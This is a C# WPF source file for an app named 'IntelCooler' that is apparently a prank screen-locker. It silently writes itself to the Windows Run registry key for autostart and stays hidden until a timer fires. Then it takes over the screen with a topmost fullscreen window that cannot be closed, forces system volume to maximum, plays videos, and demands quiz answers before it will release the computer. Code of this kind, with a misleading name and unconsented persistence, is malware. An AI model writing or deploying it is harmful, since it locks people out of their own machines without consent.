using Microsoft.Win32;
using IntelCooler.My_code;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Threading;
using System.Media;

namespace IntelCooler
{

    public partial class MainWindow : Window
    {

        //The obj that contains hotkeys and timer for starting the app
        static HotkeyControl KeyHandler;

        //The obj that contains the functions for turning up the volume
        public static VolumeControl VolumeHandler;

        //A reference to the window's self so that it can be accessed by other functions
        static MainWindow main;

        //The questions that will be used for the test
        public static Test MyTest = new Test();

        //The number of right answers that the user has answered in a row
        public static int AnswerIndex = 0;

        public static int WrongAnswerIndex = 0;

        //The answer to the current question
        public string TheAnswer;

        //if the app can close
        public static bool CanClose = false;

        //if the user can take the test
        public static bool CanTest = true;

        public static System.Windows.Forms.Timer TestAgainTimer;

        public static Media MyMedia = new Media();

        //The sounds for the correct and wrong answers
        SoundPlayer Wrong = new SoundPlayer(Constants.WrongAnswerSound);
        SoundPlayer Correct = new SoundPlayer(Constants.CorrectAnswerSound);



        //Setup for autorun by making a registery key
        RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);



        public MainWindow()
        {

            //Set to autorun on startup
            reg.SetValue(Constants.AppName, System.Windows.Forms.Application.ExecutablePath.ToString());

            InitializeComponent();

            main = this;

            KeyHandler = new HotkeyControl();

            //Set of hotkey timer
            KeyHandler.ShowMe.Elapsed += OnTimedEvent;


            //So that the window can't the covered
            Topmost = true;

            //Add closing blocking func to the main window closing event so that the window can't closed
            Closing += MainWindow_Closing;

            ////So that it can't be minimized
            StateChanged += TriedToCloseMe;

            Hide();

            //Get the with of the primary screen and set it to the media element width
            VidPlayer.Width = SystemParameters.PrimaryScreenWidth;

            //Stretch the media element's hight in a uniform way
            VidPlayer.Stretch = Stretch.Uniform;

            //The highest the volume can be
            VidPlayer.Volume = 1;

            VidPlayer.MediaEnded += PlayNextVideo;

            //Make the application fullscreen
            WindowState = WindowState.Maximized;
            WindowStyle = WindowStyle.None;

            //Find the progress bar showing the time until the user can take the test again
            ProgressUntilTestAgain.Visibility = Visibility.Hidden;


            //Hind everything user the question event is triggered
            HideEverything();

            TextWrongAnswers.Text = "Wrong Answers Left: " + (Constants.WrongAnswerMax - WrongAnswerIndex).ToString();
        }

        //Called when a video ends
        void PlayNextVideo(object sender, RoutedEventArgs e)
        {

            //The path of the video file
            string path = System.IO.Path.Combine(Environment.CurrentDirectory, MyMedia.GetVideo());

            //Set video's source
            VidPlayer.Source = new Uri(path, UriKind.Absolute);

        }

        //Attached to the event for when the volume controller ends
        private static void OnTimedEventVolume(Object source, System.Timers.ElapsedEventArgs e)
        {

            VolumeHandler.SetToMaxVolume();
        }


        private static void OnTimedEvent(Object source, System.Timers.ElapsedEventArgs e)
        {

            //Only one thread can access it
            main.Dispatcher.Invoke(() =>
            {
                main.Show();

                //Set up the video
                main.PlayNextVideo(new object(), new RoutedEventArgs());

                main.VidPlayer.Play();
            });

            //Set volume timer
            VolumeHandler = new VolumeControl();
            VolumeHandler.SetToMaxVolume();

            //setup volume control timer
            VolumeHandler.SetMaxVolumeTimer.Elapsed += OnTimedEventVolume;

            //Turn off other timer
            KeyHandler.ShowMe.Interval = Constants.WaitTime;
            KeyHandler.ShowMe.Enabled = false;

        }

        //Cancel window closing event keeping the user from being able to close the window
        private void MainWindow_Closing(object sender, CancelEventArgs e)
        {

            if (!CanClose)
            {
                e.Cancel = true;
                if (CanTest)
                    QuetionEvent();

            }
        }

        void TriedToCloseMe(object sender, EventArgs e)
        {
            //Only one thread can access it
            WindowState = WindowState.Maximized;
        }

        private void textBlock_TextChanged(object sender, TextChangedEventArgs e) { }


        void SetNextQuesiton()
        {

            //So that is program can have random numbers
            Random rnd = new Random();

            //The Question that will be used
            Question q = MyTest.TheQuetions[rnd.Next(MyTest.TheQuetions.Count())];

            TheAnswer = q.AnsList[3];

            QuestionText.Text = q.TheQuestion;

            //Random answers for each button
            button.Content = q.AnsList[rnd.Next(q.AnsList.Count())];
            q.AnsList.Remove(button.Content.ToString());

            button1.Content = q.AnsList[rnd.Next(q.AnsList.Count())];
            q.AnsList.Remove(button1.Content.ToString());

            button2.Content = q.AnsList[rnd.Next(q.AnsList.Count())];
            q.AnsList.Remove(button2.Content.ToString());

            button3.Content = q.AnsList[0];
            q.AnsList.Remove(button3.Content.ToString());

            //So that the question can to be picked again
            MyTest.TheQuetions.Remove(q);
        }

        //Hind the window
        void CloseApp()
        {
            //Reset the quesitons
            MyTest = new Test();

            AnswerIndex = 0;
            WrongAnswerIndex = 0;

            VidPlayer.Source = null;
            VidPlayer.Stop();

            VolumeHandler.SetMaxVolumeTimer.Elapsed -= OnTimedEventVolume;
            VolumeHandler.SetMaxVolumeTimer.Enabled = false;

            main.Hide();

        }

        //Close of window/app
        void TrueCLose () {

            CanClose = true;
            Close();

        }

        //Hind all the elements on the screen associated with the test
        void HideEverything()
        {
            TextRightAnswers.Visibility = Visibility.Hidden;
            TextWrongAnswers.Visibility = Visibility.Hidden;
            QuestionText.Visibility = Visibility.Hidden;
            button.Visibility = Visibility.Hidden;
            button1.Visibility = Visibility.Hidden;
            button2.Visibility = Visibility.Hidden;
            button3.Visibility = Visibility.Hidden;

        }

        //Show all the elements on the screen associated with the test
        void ShowEverything()
        {
            TextRightAnswers.Visibility = Visibility.Visible;
            TextWrongAnswers.Visibility = Visibility.Visible;
            QuestionText.Visibility = Visibility.Visible;
            button.Visibility = Visibility.Visible;
            button1.Visibility = Visibility.Visible;
            button2.Visibility = Visibility.Visible;
            button3.Visibility = Visibility.Visible;
        }


        //When the user is asked to answer some questions to get their computer back
        void QuetionEvent()
        {

            //So that it only trigger the first time the user start the test
            if (TestAgainTimer == null)
            {
                System.Windows.Forms.MessageBox.Show("Oh! It looks like you want your computer back. Answer three question correctly in a row to get it back");
                SetNextQuesiton();

            }

            CanTest = false;

            //Make everything visible
            ShowEverything();

        }

        //Ends the current test
        void QuestionEventEnd()
        {

            HideEverything();

            System.Windows.Forms.MessageBox.Show("Too bad, you ran out of tries. Wait " + (Constants.TestAgainTime / 1000) + "s to try again");

            SetupTimer();

            SetupProgressBar();

        }

        //Test timer until the user can take the test again
        void SetupTimer()
        {

            TestAgainTimer = new System.Windows.Forms.Timer { Interval = Constants.TestAgainTime, Enabled = true };
            TestAgainTimer.Tick += OnTestAgainTimerTick;
            TestAgainTimer.Interval = 1; //IDK why 16 work, but it does

        }

        //Set up the progress bar than shows how far the user must wait until he or she can test again
        void SetupProgressBar()
        {
            ProgressUntilTestAgain.Visibility = Visibility.Visible;
            ProgressUntilTestAgain.Value = 0;
            ProgressUntilTestAgain.Maximum = Constants.TestAgainTime;
            ProgressUntilTestAgain.Width = SystemParameters.PrimaryScreenWidth;

        }

        void OnTestAgainTimerTick(object sender, EventArgs e)
        {
            ProgressUntilTestAgain.Value += 24; //IDK why 24 works but it does

            if (ProgressUntilTestAgain.Value == ProgressUntilTestAgain.Maximum)
                OnTestAgainTimer();

        }


        //called when the test gain timer ends
        void OnTestAgainTimer()
        {
            TestAgainTimer.Enabled = false;
            CanTest = true;

            //Hind the test again progress bar
            ProgressUntilTestAgain.Visibility = Visibility.Hidden;

        }


        //The function that is called when an answer is picked
        void OnButtonClick(Button b)
        {
            //If the answer in right
            if (b.Content.ToString() == TheAnswer)
            {
                AnswerIndex += 1;
                Correct.Play();

                //Close the app if the user gets three right answers in a row
                if (AnswerIndex == 3)
                {
                    System.Windows.Forms.MessageBox.Show("Good Job!");
                    CloseApp();
                }
            }

            //If it is wrong
            else
            {
                WrongAnswerIndex += 1;
                AnswerIndex = 0;
                Wrong.Play();


                if (WrongAnswerIndex == Constants.WrongAnswerMax && MyTest.TheQuetions.Count() != 0)
                    QuestionEventEnd();

                TextWrongAnswers.Text = "Wrong Answers Left: " + (Constants.WrongAnswerMax - WrongAnswerIndex).ToString();
            }

            TextRightAnswers.Text = "Right Answers: " + AnswerIndex.ToString();

            SetNextQuesiton();

            //If the player has no more answers left
            //The system only allow for one close at a time
            if (MyTest.TheQuetions.Count() == 0 && AnswerIndex != 3)
            {
                System.Windows.Forms.MessageBox.Show("WOW YOU SUCK! Your out of questions");
                CloseApp();
            }

        }


        private void button3_Click(object sender, RoutedEventArgs e)
        {
            OnButtonClick(button3);
        }

        private void button2_Click(object sender, RoutedEventArgs e)
        {
            OnButtonClick(button2);

        }

        private void button1_Click(object sender, RoutedEventArgs e)
        {
            OnButtonClick(button1);

        }

        private void button_Click(object sender, RoutedEventArgs e)
        {
            OnButtonClick(button);

        }

        private void ProgressUntilTestAgain_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e) { }
    }
}
